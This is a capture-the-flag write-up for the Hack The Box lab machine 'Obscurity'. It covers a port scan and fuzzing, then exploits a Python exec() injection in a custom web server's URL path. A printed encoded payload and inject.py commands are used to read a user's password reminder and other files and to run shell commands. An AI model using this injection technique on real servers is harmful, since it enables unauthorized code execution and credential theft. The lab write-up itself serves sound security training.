# [Obscurity](https://www.hackthebox.eu/home/machines/profile/219)
## IP : 10.10.10.168

## **Step 0** : Ports Scan

![Port Scan Result](images/port_scan.png)

* Website : http://10.10.10.168:8080/

## __Step 1__ : Hints from the [home page](http://10.10.10.168:8080/).

> Message to server devs: the current source code for the web server is in __SuperSecureServer.py__ in the secret development directory`

After some tests the server is fuzzable from the root. Any file or folder can be returned by the browser.

![FFUF Report](images/ffuf_report.png)

* Server code : http://10.10.10.168:8080/develop/SuperSecureServer.py

## __Step 2__ : Understanding the custom made server

From *hints/SuperSecureServer.py* :
```python
def serveDoc(self, path, docRoot):
    ...
    path = urllib.parse.unquote(path)
    ...
    exec(info.format(path)) # This is how you do string formatting, right?
    ...
    return {"body": data, "mime": mime, "status": status}
```
The `path` parameter coming from the URL. So it's possible to inject python code from url. We need to encode with `urllib.quote()` the code to send it to the http server:

> http://obscurity/{urlib_quoted_python_code}

Also, the code shows that through this function, only the **mime** var can be used to get info back.

## **Step 3** : Injection & Enumeration

With code used in *lab/inject.py* :

![injection_result](images/inject_report.png)

We see that we're **user=www-data(uid=33)**

* Time to see what's Robert has for us :

![Clues,clues,clues](images/inject_robert.png)

We can't read **user.txt** yet.
But it seems we can have hints on the next step with the other files.

```
$ python3 lab/inject.py "open('/home/robert/passwordreminder.txt','r').read()"
Payload : %27%3BMIMES%5B%27html%27%5D%3Dopen%28%27/home/robert/passwordreminder.txt%27%2C%27r%27%29.read%28%29%3Ba%3D%27
Â´ÃÃÃÃÃ ÃÃÃÃ©Â¯Â·Â¿k
````
* Weird encoding, got password from Chrome : 

![thank_you_chrome](images/chrome_password.png)

To summarize : 
* User : **robert**
* Password : **´ÑÈÌÉàÙÁÑé¯·¿k**

Let's try that : 
```
$ ssh robert@10.10.10.168
robert@10.10.10.168's password: 
Permission denied, please try again.
```

### Time to enumerate more...

```
$ python3 lab/inject.py "open('/home/robert/check.txt','r').read()" 

Encrypting this file with your key should result in out.txt
make sure your key is correct! 

$ python3 lab/inject.py "open('/home/robert/out.txt','r').read()"

 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v

$ python3 lab/inject.py "os.popen('ls -l /home/robert/BetterSSH').readlines()"

['total 4'
 '-rwxr-xr-x 1 root root 1805 Oct  5 13:09 BetterSSH.py']
```